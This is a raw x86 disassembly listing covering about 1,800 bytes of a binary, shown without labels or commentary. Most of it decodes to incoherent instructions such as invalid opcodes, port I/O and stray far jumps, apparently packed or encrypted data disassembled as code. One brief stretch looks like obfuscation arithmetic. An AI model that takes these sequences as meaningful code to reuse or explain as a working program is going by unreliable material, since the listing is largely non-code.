  41c445:	cmp    BYTE PTR [ecx-0x1f],0x16
  41c449:	mov    eax,ds:0x3aa19a5f
  41c44e:	or     ebp,DWORD PTR [esi-0x4c]
  41c451:	fnstsw WORD PTR [edx+0x7a2d89c6]
  41c457:	xchg   edi,eax
  41c458:	mov    esi,0xe580d72d
  41c45d:	sar    DWORD PTR [esi],cl
  41c45f:	xchg   esi,eax
  41c460:	jmp    0x41c4b5
  41c462:	lock and ebp,DWORD PTR [ebx]
  41c465:	push   cs
  41c466:	mov    ecx,0x192d3aa8
  41c46b:	ror    DWORD PTR [edx+ecx*2],1
  41c46e:	shl    DWORD PTR [ecx],0xa8
  41c471:	aad    0xc2
  41c473:	jg     0x41c452
  41c475:	in     eax,dx
  41c476:	xchg   edi,eax
  41c477:	sub    ebp,DWORD PTR [esi-0x34]
  41c47a:	nop
  41c47b:	pop    es
  41c47c:	jmp    0x41c49c
  41c47e:	xor    al,0x89
  41c480:	jmp    0x41c4bc
  41c482:	pusha  
  41c483:	int3   
  41c484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c485:	(bad)  
  41c486:	mov    bh,0x8c
  41c488:	fdivr  DWORD PTR [esi+0x5837d5e1]
  41c48e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c48f:	cli    
  41c490:	stc    
  41c491:	arpl   WORD PTR [edi],sp
  41c493:	test   eax,0x5f3cc0de
  41c498:	mov    edx,0x70376802
  41c49d:	pop    esi
  41c49e:	sti    
  41c49f:	retf   
  41c4a0:	dec    ebp
  41c4a1:	mov    DWORD PTR [edi-0x49],ebp
  41c4a4:	(bad)  
  41c4a5:	and    al,0x78
  41c4a7:	(bad)  
  41c4a8:	iret   
  41c4a9:	xchg   esi,eax
  41c4aa:	mov    BYTE PTR [ebx+edi*2+0x2a],cl
  41c4ae:	and    eax,0x6d5eb3c6
  41c4b3:	pop    ds
  41c4b4:	add    al,BYTE PTR [edi]
  41c4b6:	xor    cl,dh
  41c4b8:	cli    
  41c4b9:	retf   0x8dde
  41c4bc:	push   ds
  41c4bd:	cmp    DWORD PTR [ebx],0xfffffff1
  41c4c0:	rcl    BYTE PTR [ebp-0x80],1
  41c4c3:	push   ss
  41c4c4:	add    al,0x5
  41c4c6:	sub    eax,0x24e52bda
  41c4cb:	inc    esi
  41c4cc:	xchg   edx,eax
  41c4cd:	daa    
  41c4ce:	adc    dh,BYTE PTR [ecx+0x5418d4c7]
  41c4d4:	mov    edx,DWORD PTR [ecx+0xfff21c6]
  41c4da:	xchg   esi,eax
  41c4db:	sub    eax,0x5fbc16e9
  41c4e0:	adc    eax,0x8ed386c2
  41c4e5:	mov    ebp,0xdaa49993
  41c4ea:	jmp    0x84ef8a18
  41c4ef:	call   0x84561928
  41c4f4:	adc    esp,ebx
  41c4f6:	test   al,0x71
  41c4f8:	iret   
  41c4f9:	xor    ah,BYTE PTR [edi+0x134b75ec]
  41c4ff:	pushf  
  41c500:	add    al,0xce
  41c502:	cmp    BYTE PTR [edx-0x5b],al
  41c505:	retf   
  41c506:	adc    ah,BYTE PTR [ebx]
  41c508:	cs pop ebx
  41c50a:	lods   eax,DWORD PTR ds:[esi]
  41c50b:	add    al,0x81
  41c50d:	push   esi
  41c50e:	sub    cl,BYTE PTR [ecx+0x31700570]
  41c514:	pop    edx
  41c515:	xchg   ecx,eax
  41c516:	pop    ss
  41c517:	push   ebx
  41c518:	sub    DWORD PTR [esi+0x7a],edi
  41c51b:	mov    cl,0x45
  41c51d:	(bad)  
  41c51e:	fist   DWORD PTR [edx+ecx*2-0x39]
  41c522:	mov    ebp,0xe7c619bd
  41c527:	adc    DWORD PTR [ebp-0x3109770c],esi
  41c52d:	push   edx
  41c52e:	jle    0x41c4e3
  41c530:	add    DWORD PTR [esi-0xe],eax
  41c533:	xchg   DWORD PTR [esp+edi*4-0x4f],ecx
  41c537:	push   eax
  41c538:	pmullw mm5,QWORD PTR ds:[ebx+0x2c]
  41c53d:	push   esp
  41c53e:	sbb    DWORD PTR [edi],edx
  41c540:	mov    eax,0xa91411a9
  41c545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c546:	mov    dl,0xeb
  41c548:	js     0x41c55f
  41c54a:	push   ss
  41c54b:	mov    esi,ebx
  41c54d:	gs pusha 
  41c54f:	mov    WORD PTR [ebx],cs
  41c551:	loope  0x41c53a
  41c553:	push   ss
  41c554:	cmp    ebp,DWORD PTR [edi-0xe]
  41c557:	jp     0x41c57f
  41c559:	outs   dx,DWORD PTR ds:[esi]
  41c55a:	inc    ecx
  41c55b:	inc    DWORD PTR [edi+0x24]
  41c55e:	test   DWORD PTR [edi+edx*4-0xfa1f934],0xd56f925a
  41c569:	in     al,0xf1
  41c56b:	jle    0x41c5cf
  41c56d:	fwait
  41c56e:	outs   dx,BYTE PTR ds:[esi]
  41c56f:	fldcw  WORD PTR [ebx-0x7d]
  41c572:	pop    DWORD PTR [ebx-0x4d879384]
  41c578:	ret    
  41c579:	push   es
  41c57a:	inc    ecx
  41c57b:	mov    WORD PTR [eax],?
  41c57d:	clc    
  41c57e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c57f:	and    esi,DWORD PTR [ebx-0x37cc678b]
  41c585:	xor    edx,eax
  41c587:	sub    ecx,edx
  41c589:	sub    ecx,esi
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	adc    al,0x3d
  41c5d2:	aas    
  41c5d3:	aam    0xfe
  41c5d5:	loope  0x41c654
  41c5d7:	jp     0x41c5e3
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	(bad)  
  41c5dd:	jno    0x41c58f
  41c5df:	mov    fs,edi
  41c5e1:	sub    al,0x3e
  41c5e3:	push   ecx
  41c5e4:	cld    
  41c5e5:	sahf   
  41c5e6:	mov    edx,0xf894f064
  41c5eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ec:	or     dh,bh
  41c5ee:	retf   0x4cab
  41c5f1:	shr    ebp,1
  41c5f3:	adc    al,0xfc
  41c5f5:	sbb    BYTE PTR [edi+0x2ddb4f84],bh
  41c5fb:	adc    eax,0x293933a9
  41c600:	xor    al,0x27
  41c602:	mov    esi,DWORD PTR [ebp+0xf077c25]
  41c608:	jb     0x41c63e
  41c60a:	and    esi,DWORD PTR [edx]
  41c60c:	(bad)  
  41c60d:	imul   ebx,ebx,0xffffffda
  41c610:	je     0x41c615
  41c612:	scas   eax,DWORD PTR es:[edi]
  41c613:	inc    ebp
  41c614:	imul   ebp,DWORD PTR [ebp-0x29],0xb7599222
  41c61b:	ret    0x6beb
  41c61e:	ja     0x41c64b
  41c620:	fnsave [eax+0x7d]
  41c623:	ss jp  0x41c61c
  41c626:	aas    
  41c627:	push   esp
  41c628:	cmp    al,0xd2
  41c62a:	sbb    BYTE PTR [edx+0x37],dh
  41c62d:	push   esi
  41c62e:	dec    esp
  41c62f:	mov    edi,0xb81fe662
  41c634:	and    BYTE PTR [esp+edx*2],ah
  41c637:	lods   eax,DWORD PTR ds:[esi]
  41c638:	ds (bad) 
  41c63a:	mov    bl,0x95
  41c63c:	add    bh,BYTE PTR [edi-0x50]
  41c63f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c640:	jle    0x41c6b7
  41c642:	jecxz  0x41c5cf
  41c644:	dec    ecx
  41c645:	js     0x41c649
  41c647:	adc    al,0xed
  41c649:	xor    eax,0xd85c6b1f
  41c64e:	xchg   dl,al
  41c650:	jg     0x41c6d1
  41c652:	cmc    
  41c653:	fnsave [edx]
  41c655:	xor    BYTE PTR [eax-0x66aafb09],0x38
  41c65c:	push   esp
  41c65d:	int3   
  41c65e:	jmp    0x7268:0x66289512
  41c665:	add    bh,BYTE PTR [ebp-0xb54c0d6]
  41c66b:	ds cwde 
  41c66d:	mov    BYTE PTR [eax+0x639fc25],ch
  41c673:	inc    edi
  41c674:	(bad)  
  41c676:	cdq    
  41c677:	push   edx
  41c678:	xchg   DWORD PTR [ebp-0x67f0d408],esi
  41c67e:	inc    ebp
  41c67f:	jg     0x41c6d7
  41c681:	les    esp,FWORD PTR [edx]
  41c683:	mov    esi,0xbe559793
  41c688:	sahf   
  41c689:	les    eax,FWORD PTR [eax+eiz*1]
  41c68c:	add    esi,esi
  41c68e:	add    esp,DWORD PTR [ecx]
  41c690:	outs   dx,BYTE PTR ds:[esi]
  41c691:	pop    ebp
  41c692:	dec    ecx
  41c693:	sub    BYTE PTR [esi+0x73],ah
  41c696:	jl     0x41c640
  41c698:	cld    
  41c699:	retf   
  41c69a:	push   eax
  41c69b:	mov    ds:0x7fc27a8,al
  41c6a0:	or     ecx,ebx
  41c6a2:	mov    ds:0x7999ff97,al
  41c6a7:	sub    bh,BYTE PTR [ebp+0x2f]
  41c6aa:	mov    DWORD PTR ds:0xcf5588d1,ecx
  41c6b0:	fisttp QWORD PTR [ebp+0x5]
  41c6b3:	cwde   
  41c6b4:	fadd   st,st(4)
  41c6b6:	add    BYTE PTR [edx-0x102604f0],ch
  41c6bc:	sbb    dl,bl
  41c6be:	xor    DWORD PTR [eax],edx
  41c6c0:	ja     0x41c695
  41c6c2:	fsub   DWORD PTR [edx-0x25c2a453]
  41c6c8:	sar    BYTE PTR [ebx+eax*1-0x351995ac],0x17
  41c6d0:	dec    esp
  41c6d1:	sahf   
  41c6d2:	adc    al,0x27
  41c6d4:	out    0x9b,al
  41c6d6:	cmp    dl,BYTE PTR [esi-0x173c133e]
  41c6dc:	xchg   BYTE PTR [edx],dl
  41c6de:	cmp    eax,0xffffff98
  41c6e1:	push   ebp
  41c6e2:	outs   dx,BYTE PTR ds:[esi]
  41c6e3:	push   es
  41c6e4:	add    DWORD PTR [ebx+0x46b133e2],ecx
  41c6ea:	out    dx,al
  41c6eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6ec:	mov    ebx,0x1cfaaaa8
  41c6f1:	stc    
  41c6f2:	cmp    BYTE PTR [ecx-0x1a74524e],dh
  41c6f8:	mov    ebp,0x71f37b65
  41c6fd:	mov    dl,0x6b
  41c6ff:	(bad)  
  41c700:	sbb    ecx,DWORD PTR [eax]
  41c702:	gs dec edi
  41c704:	mov    ecx,0x4e146222
  41c709:	dec    eax
  41c70a:	mov    eax,ds:0x95e32b68
  41c70f:	out    dx,al
  41c710:	and    ebp,ecx
  41c712:	imul   edx,DWORD PTR [ecx-0x3b2bf687],0xffffffa0
  41c719:	retf   0x62fe
  41c71c:	xchg   ebx,eax
  41c71d:	add    DWORD PTR [edx-0x43906a2f],esi
  41c723:	fidiv  DWORD PTR [esi]
  41c725:	call   FWORD PTR [esi]
  41c727:	loope  0x41c73e
  41c729:	leave  
  41c72a:	push   ds
  41c72b:	sub    edx,DWORD PTR [ebp+0x799605d2]
  41c731:	ss es jne 0x41c76f
  41c735:	pop    ds
  41c736:	rcr    BYTE PTR [ecx],1
  41c738:	cmp    edi,DWORD PTR [ebp+0x47]
  41c73b:	cs pop ebp
  41c73d:	adc    edx,DWORD PTR [eax]
  41c73f:	test   DWORD PTR [esi+0x4b6e811d],edx
  41c745:	adc    eax,0xa4afc048
  41c74a:	jg     0x41c770
  41c74c:	sbb    BYTE PTR [edi+0x3450c395],0xab
  41c753:	test   eax,0xdeace4e3
  41c758:	pop    ds
  41c759:	sbb    cl,BYTE PTR [esi+0x77]
  41c75c:	mov    BYTE PTR [esi*4+0x5f768fe],dl
  41c763:	(bad)  
  41c764:	or     ah,BYTE PTR [ebx-0x10]
  41c767:	push   ebx
  41c768:	(bad)  
  41c769:	pop    ss
  41c76a:	mov    dl,0x3a
  41c76c:	fcmovnbe st,st(5)
  41c76e:	mov    bh,0x67
  41c770:	aaa    
  41c771:	xor    BYTE PTR [edx+0x4],dh
  41c774:	pop    edx
  41c775:	cld    
  41c776:	repz and al,0x19
  41c779:	jns    0x41c7a5
  41c77b:	shr    BYTE PTR [edi],1
  41c77d:	or     BYTE PTR [edi-0x6ae38d9],bh
  41c783:	sbb    eax,0x3eea23c7
  41c788:	inc    edx
  41c789:	xchg   ebp,eax
  41c78a:	pop    edi
  41c78b:	push   cs
  41c78c:	pop    ecx
  41c78d:	pop    ds
  41c78e:	inc    eax
  41c78f:	or     ecx,DWORD PTR [edi]
  41c791:	fcomi  st,st(6)
  41c793:	sbb    ch,ch
  41c795:	and    bh,BYTE PTR [edx]
  41c797:	sbb    ebp,DWORD PTR [ebx+0xb]
  41c79a:	inc    esi
  41c79b:	les    esi,FWORD PTR [ebp+0x4]
  41c79e:	and    eax,0xf8e07e2d
  41c7a3:	sar    esi,1
  41c7a5:	cmp    al,0x50
  41c7a7:	ds jmp 0x41c77d
  41c7aa:	inc    ebp
  41c7ab:	ret    0x10e5
  41c7ae:	pop    edx
  41c7af:	lds    eax,FWORD PTR [ecx]
  41c7b1:	aas    
  41c7b2:	les    esi,FWORD PTR [esi]
  41c7b4:	inc    edi
  41c7b5:	pop    ebx
  41c7b6:	xchg   ebp,eax
  41c7b7:	add    BYTE PTR [edx-0x36d3c916],cl
  41c7bd:	retf   0x2b7a
  41c7c0:	or     ch,BYTE PTR [esi-0x7]
  41c7c3:	jne    0x41c7cf
  41c7c5:	repz es jne 0x41c756
  41c7c9:	cs mov ch,0xc5
  41c7cc:	inc    ebp
  41c7cd:	sub    BYTE PTR [ebp-0x79c10cf1],0x3b
  41c7d4:	nop
  41c7d5:	adc    al,0x7f
  41c7d7:	pop    ecx
  41c7d8:	mov    bh,0x3b
  41c7da:	jb     0x41c824
  41c7dc:	push   0xc79f623c
  41c7e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7e2:	pop    edi
  41c7e3:	pop    ss
  41c7e4:	xor    eax,0x5b9fd328
  41c7e9:	mov    ds:0x99c5f28e,eax
  41c7ee:	sub    eax,esi
  41c7f0:	inc    edx
  41c7f1:	and    edi,edi
  41c7f3:	inc    edx
  41c7f4:	xor    al,0xbb
  41c7f6:	mov    esi,0x26411451
  41c7fb:	xchg   edx,eax
  41c7fc:	js     0x41c844
  41c7fe:	adc    DWORD PTR [ebp+0x3f],0x5a
  41c802:	pop    es
  41c803:	ja     0x41c830
  41c805:	pushf  
  41c806:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c808:	sub    bh,BYTE PTR [edx]
  41c80a:	aam    0xfa
  41c80c:	outs   dx,BYTE PTR ds:[esi]
  41c80d:	xor    al,0x50
  41c80f:	xchg   ebx,eax
  41c810:	xchg   edi,eax
  41c811:	lahf   
  41c812:	or     BYTE PTR [ebp-0x3f5e5ed1],bh
  41c818:	pop    es
  41c819:	retw   
  41c81b:	stc    
  41c81c:	xchg   ecx,eax
  41c81d:	pushf  
  41c81e:	sub    al,BYTE PTR [eax-0x4c]
  41c821:	in     al,dx
  41c822:	mov    dl,0x95
  41c824:	sbb    al,0x2e
  41c826:	and    al,0xb
  41c828:	or     al,0x3a
  41c82a:	loope  0x41c7ae
  41c82c:	(bad)  
  41c82d:	hlt    
  41c82e:	scas   eax,DWORD PTR es:[edi]
  41c82f:	mov    edx,0x8ee49fd3
  41c834:	repz cmp dh,BYTE PTR [edx]
  41c837:	sub    DWORD PTR [esp+esi*1+0x7d],edx
  41c83b:	inc    esi
  41c83c:	sbb    ecx,DWORD PTR [esi+0x2ef63dbb]
  41c842:	mov    ch,BYTE PTR [edx-0x3a]
  41c845:	(bad)  
  41c846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c847:	scas   eax,DWORD PTR es:[edi]
  41c848:	mov    bh,BYTE PTR [edx-0x71]
  41c84b:	add    DWORD PTR [ebp-0x5e],ebx
  41c84e:	retf   
  41c84f:	mov    DWORD PTR [ebp-0x3627ba1b],ebx
  41c855:	mov    eax,0x212fde08
  41c85a:	mov    ch,0x63
  41c85c:	jmp    0x41c8a6
  41c85e:	add    BYTE PTR [edi+0x33],cl
  41c861:	push   0x614b0b7f
  41c866:	push   es
  41c867:	clc    
  41c868:	add    ebx,DWORD PTR ds:0x957c42b3
  41c86e:	je     0x41c81a
  41c870:	and    al,0x45
  41c872:	stos   DWORD PTR es:[edi],eax
  41c873:	jne    0x41c854
  41c875:	add    edx,edx
  41c877:	or     eax,0x93eb4e68
  41c87c:	hlt    
  41c87d:	neg    ah
  41c87f:	mov    eax,0x95f2f6ad
  41c884:	fisub  DWORD PTR [edi]
  41c886:	sub    edi,DWORD PTR [ecx+0x5c]
  41c889:	mov    ch,BYTE PTR [ebx+0x17]
  41c88c:	push   esp
  41c88d:	add    DWORD PTR [eax-0x5f],ebx
  41c890:	cli    
  41c891:	add    eax,DWORD PTR [edx-0x66]
  41c894:	leave  
  41c895:	loop   0x41c90e
  41c897:	cdq    
  41c898:	or     eax,ebp
  41c89a:	leave  
  41c89b:	sub    DWORD PTR [eax+0x31c43530],edi
  41c8a1:	adc    eax,0xf457948b
  41c8a6:	popf   
  41c8a7:	(bad)  
  41c8a8:	in     eax,0xc7
  41c8aa:	cmp    al,0x27
  41c8ac:	sbb    al,0x8a
  41c8ae:	xchg   edx,eax
  41c8af:	jge    0x41c8a5
  41c8b1:	mov    ah,0xa
  41c8b3:	jge    0x41c871
  41c8b5:	out    dx,eax
  41c8b6:	fadd   st,st(6)
  41c8b8:	retf   0xc888
  41c8bb:	adc    ebx,0xffffffc9
  41c8be:	dec    ebp
  41c8bf:	cmp    ch,bh
  41c8c1:	sub    eax,0x5146b48e
  41c8c6:	(bad)  
  41c8c7:	jmp    0xbd3d4a22
  41c8cc:	fdiv   QWORD PTR [eax-0x36]
  41c8cf:	loop   0x41c908
  41c8d1:	push   cs
  41c8d2:	shl    BYTE PTR [esi+0x9],cl
  41c8d5:	outs   dx,DWORD PTR ds:[esi]
  41c8d6:	clc    
  41c8d7:	xor    dh,BYTE PTR [ecx]
  41c8d9:	push   eax
  41c8da:	inc    esi
  41c8db:	push   esi
  41c8dc:	jnp    0x41c8c5
  41c8de:	mov    dl,0xb8
  41c8e0:	mov    ebx,0xde8de2ef
  41c8e5:	mov    al,BYTE PTR [ebx+0x6c]
  41c8e8:	idiv   DWORD PTR [eax]
  41c8ea:	pop    ss
  41c8eb:	adc    BYTE PTR [esi-0x6d],0xe1
  41c8ef:	retf   0x600f
  41c8f2:	repnz mov ds:0xb072e3a7,al
  41c8f8:	retf   0xe317
  41c8fb:	xchg   edx,eax
  41c8fc:	sti    
  41c8fd:	lods   eax,DWORD PTR ds:[esi]
  41c8fe:	xlat   BYTE PTR ds:[ebx]
  41c8ff:	xor    esp,DWORD PTR [ebp+0x62]
  41c902:	cmp    BYTE PTR [eax+0x70],0x45
  41c906:	ds jo  0x41c94f
  41c909:	xlat   BYTE PTR ds:[ebx]
  41c90a:	adc    al,0x3d
  41c90c:	mov    ecx,0xfa562abc
  41c911:	dec    eax
  41c912:	fs or  eax,edx
  41c915:	shl    BYTE PTR [eax+ebx*2],0x63
  41c919:	push   cs
  41c91a:	inc    ebx
  41c91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c91c:	repnz dec edi
  41c91e:	cmp    al,0xd6
  41c920:	icebp  
  41c921:	pop    esi
  41c922:	sub    DWORD PTR [ebp+0xbfef13e],ecx
  41c928:	stos   DWORD PTR es:[edi],eax
  41c929:	mov    ds:0xe74034ba,eax
  41c92e:	adc    bh,bl
  41c930:	jns    0x41c8f4
  41c932:	jp     0x41c9b3
  41c934:	les    ebx,FWORD PTR fs:[esi+ecx*4+0x7390b552]
  41c93c:	cmp    DWORD PTR [ebp+0x6c],edx
  41c93f:	push   es
  41c940:	jae    0x41c9bd
  41c942:	in     al,0x40
  41c944:	inc    edx
  41c945:	mov    ds:0x85d10ae5,al
  41c94a:	inc    edi
  41c94b:	outs   dx,DWORD PTR ds:[esi]
  41c94c:	fwait
  41c94d:	mov    DWORD PTR [ecx-0x64],edx
  41c950:	add    edx,ebp
  41c952:	mov    edi,0x7ed819fe
  41c957:	xchg   edi,eax
  41c958:	sar    DWORD PTR [ebp-0xc],0xda
  41c95c:	xor    BYTE PTR [ecx+0x2e],bl
  41c95f:	dec    eax
  41c960:	(bad)  
  41c961:	add    al,0x9c
  41c963:	push   ds
  41c964:	call   0xf0e1:0xa3b6117f
  41c96b:	cwde   
  41c96c:	ret    
  41c96d:	imul   ebp,ecx,0x28
  41c970:	dec    ebx
  41c971:	inc    edx
  41c972:	mov    edx,ecx
  41c974:	push   0xffffffd6
  41c976:	pop    es
  41c977:	pop    edi
  41c978:	std    
  41c979:	nop
  41c97a:	mov    eax,0xe6b04a34
  41c97f:	jge    0x41c9c2
  41c981:	clc    
  41c982:	sbb    dh,cl
  41c984:	ret    0x9f6c
  41c987:	inc    esi
  41c988:	ins    DWORD PTR es:[edi],dx
  41c989:	mov    eax,ds:0x2fa8bdd8
  41c98e:	mov    ebp,0xb2183b03
  41c993:	fiadd  DWORD PTR [esp+ebx*4]
  41c996:	outs   dx,BYTE PTR ds:[esi]
  41c997:	dec    ebx
  41c998:	mov    ah,0xe3
  41c99a:	and    eax,0x28ad3229
  41c99f:	dec    esi
  41c9a0:	shl    edi,1
  41c9a2:	repz xchg esp,eax
  41c9a4:	shl    esi,1
  41c9a6:	loopne 0x41c9d9
  41c9a8:	jb     0x41c95d
  41c9aa:	push   edi
  41c9ab:	lds    ebx,FWORD PTR [ecx]
  41c9ad:	ret    0x69b7
  41c9b0:	xor    al,BYTE PTR [edx+0x21]
  41c9b3:	(bad)  ds:0xafff0d39
  41c9b9:	inc    eax
  41c9ba:	cmc    
  41c9bb:	in     al,0xd8
  41c9bd:	std    
  41c9be:	or     BYTE PTR [esi+0x7ddc684d],al
  41c9c4:	push   ss
  41c9c5:	or     BYTE PTR [ebx],dl
  41c9c7:	dec    ecx
  41c9c8:	stos   DWORD PTR es:[edi],eax
  41c9c9:	push   ebx
  41c9ca:	mov    es,eax
  41c9cc:	loope  0x41c9b8
  41c9ce:	out    0xff,eax
  41c9d0:	add    al,0xbd
  41c9d2:	retf   0x3ce8
  41c9d5:	daa    
  41c9d6:	mov    al,0xa2
  41c9d8:	mov    ebx,0x7c727cbf
  41c9dd:	mov    edx,0x8b75e09d
  41c9e2:	mov    ah,0x95
  41c9e4:	mov    ebp,0x913f92c8
  41c9e9:	mov    ch,ch
  41c9eb:	or     al,0x6c
  41c9ed:	aam    0xed
  41c9ef:	popf   
  41c9f0:	std    
  41c9f1:	xlat   BYTE PTR ds:[ebx]
  41c9f2:	push   ebp
  41c9f3:	leave  
  41c9f4:	or     eax,esi
  41c9f6:	pop    ebx
  41c9f7:	lods   eax,DWORD PTR ds:[esi]
  41c9f8:	dec    ebp
  41c9f9:	lods   al,BYTE PTR ds:[esi]
  41c9fa:	retf   0x44c8
  41c9fd:	stos   BYTE PTR es:[edi],al
  41c9fe:	int3   
  41c9ff:	mov    dh,0x19
  41ca01:	rol    DWORD PTR [ecx+edi*8-0x5],0x39
  41ca06:	dec    edx
  41ca07:	mov    esp,0x7c4eb897
  41ca0c:	inc    ecx
  41ca0d:	fild   WORD PTR [si+0x2a]
  41ca11:	mov    ch,cl
  41ca13:	jle    0x41ca06
  41ca15:	sbb    al,0x8c
  41ca17:	sbb    eax,0xb23ea6bc
  41ca1c:	(bad)  
  41ca1d:	adc    eax,0x284652e3
  41ca22:	dec    edx
  41ca23:	push   esp
  41ca24:	mov    cl,BYTE PTR [ebx]
  41ca26:	mov    bh,0xf1
  41ca28:	mov    ebx,0xf65dd6f0
  41ca2d:	shl    DWORD PTR [edx-0x7f1d4135],1
  41ca33:	mov    ds:0xeb2ae31e,al
  41ca38:	rcl    DWORD PTR [ebx+eax*8],cl
  41ca3b:	inc    ebp
  41ca3c:	push   0x692eb314
  41ca41:	push   eax
  41ca42:	add    ah,al
  41ca44:	jmp    0x41ca4c
  41ca46:	out    0x23,eax
  41ca48:	dec    ebx
  41ca49:	inc    eax
  41ca4a:	popf   
  41ca4b:	add    eax,0x668b366b
  41ca50:	mov    ds:0x3c734e22,eax
  41ca55:	push   edi
  41ca56:	ins    DWORD PTR es:[edi],dx
  41ca57:	out    dx,al
  41ca58:	pop    eax
  41ca59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca5a:	inc    edx
  41ca5b:	fstp   QWORD PTR cs:[ebp-0x65c33b3b]
  41ca62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca63:	xchg   ebp,eax
  41ca64:	jge    0x41ca38
  41ca66:	cmp    DWORD PTR [ebp-0x3f8b3367],ecx
  41ca6c:	cmp    eax,0xc5e3b21
  41ca71:	pop    ebp
  41ca72:	add    al,0x37
  41ca74:	jmp    0x41ca3c
  41ca76:	xchg   esi,eax
  41ca77:	in     al,0xd9
  41ca79:	or     BYTE PTR [ebp+0x7cbda1ab],ch
  41ca7f:	imul   eax,DWORD PTR ds:0x8ed6e46c,0xc64cd6de
  41ca89:	inc    esp
  41ca8a:	pushf  
  41ca8b:	(bad)  
  41ca8c:	fild   QWORD PTR [esi-0x3aef8174]
  41ca92:	xor    DWORD PTR [esi+ebx*1+0x76],0x4e49ddf6
  41ca9a:	pop    ebx
  41ca9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca9c:	sub    BYTE PTR [esi+0x68],al
  41ca9f:	scas   eax,DWORD PTR es:[edi]
  41caa0:	and    cl,BYTE PTR [ecx]
  41caa2:	xor    al,0x14
  41caa4:	push   ebx
  41caa5:	mov    bh,0x7f
  41caa7:	mov    dh,0xca
  41caa9:	mov    dl,0x97
  41caab:	sar    ah,cl
  41caad:	pushf  
  41caae:	lods   al,BYTE PTR ds:[esi]
  41caaf:	mov    esi,0x6d9781e4
  41cab4:	das    
  41cab5:	push   ecx
  41cab6:	loopne 0x41cae3
  41cab8:	jae    0x41cb38
  41caba:	mov    ecx,0x83807ea9
  41cabf:	(bad)  
  41cac0:	scas   eax,DWORD PTR es:[edi]
  41cac1:	scas   eax,DWORD PTR es:[edi]
  41cac2:	aad    0xd4
  41cac4:	jecxz  0x41cab7
  41cac6:	hlt    
  41cac7:	sbb    DWORD PTR [ebx+0x4a],esp
  41caca:	jmp    0xac1:0x555f4913
  41cad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cad2:	pusha  
  41cad3:	mov    ds:0x325b728c,al
  41cad8:	test   DWORD PTR [ebx+0x63],ebp
  41cadb:	inc    ebp
  41cadc:	sti    
  41cadd:	jo     0x41cb5d
  41cadf:	jo     0x41cab9
  41cae1:	into   
  41cae2:	mov    esi,0xfdb724ba
  41cae7:	repnz (bad) 
  41caea:	pusha  
  41caeb:	pop    ds
  41caec:	jl     0x41cac5
  41caee:	lahf   
  41caef:	shr    ebx,cl
  41caf1:	mov    ebp,0x74c31547
  41caf6:	sub    ch,ah
  41caf8:	cmp    BYTE PTR [esi+ebp*2+0x38c99478],al
  41caff:	fwait
  41cb00:	ja     0x41cb47
  41cb02:	pop    edx
  41cb03:	mov    eax,0x9cf6ab3a
  41cb08:	sub    ebp,ebp
  41cb0a:	int    0x45
  41cb0c:	dec    ebx
  41cb0d:	xor    al,0x1c
  41cb0f:	cmp    ch,BYTE PTR [edx+eiz*2-0x46]
  41cb13:	mov    cs,WORD PTR [esi+0x326dfe9a]
  41cb19:	imul   ebx,DWORD PTR [ecx],0xcaea66ad
  41cb1f:	and    DWORD PTR [esi-0x6da288eb],0x2e2e682a
  41cb29:	sahf   
  41cb2a:	in     al,0x7b
  41cb2c:	xor    al,0xb1
  41cb2e:	push   edi
  41cb2f:	xor    dh,BYTE PTR [edi+0x19]
  41cb32:	push   eax
  41cb33:	jg     0x41cb60
  41cb35:	sbb    dl,al
  41cb37:	pop    ebp
  41cb38:	loopne 0x41cba5
  41cb3a:	and    esi,edx
  41cb3c:	pop    es
  41cb3d:	out    0xf3,eax
  41cb3f:	push   0xffffffff
  41cb41:	xor    al,0xb4
  41cb43:	popf   
  41cb44:	cmc    
  41cb45:	ins    DWORD PTR es:[edi],dx
  41cb46:	adc    al,dl
  41cb48:	fidivr WORD PTR [esi+edx*2]
  41cb4b:	push   es
  41cb4c:	ds popa 
  41cb4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb4f:	outs   dx,BYTE PTR ds:[esi]
  41cb50:	and    BYTE PTR [ecx+0x40],al
  41cb53:	push   eax
  41cb54:	int    0x98
  41cb56:	daa    
  41cb57:	popa   
  41cb58:	std    
  41cb59:	inc    esi
  41cb5a:	xlat   BYTE PTR ds:[ebx]
  41cb5b:	cwde   
  41cb5c:	rcl    BYTE PTR ds:0x29ed47c,cl
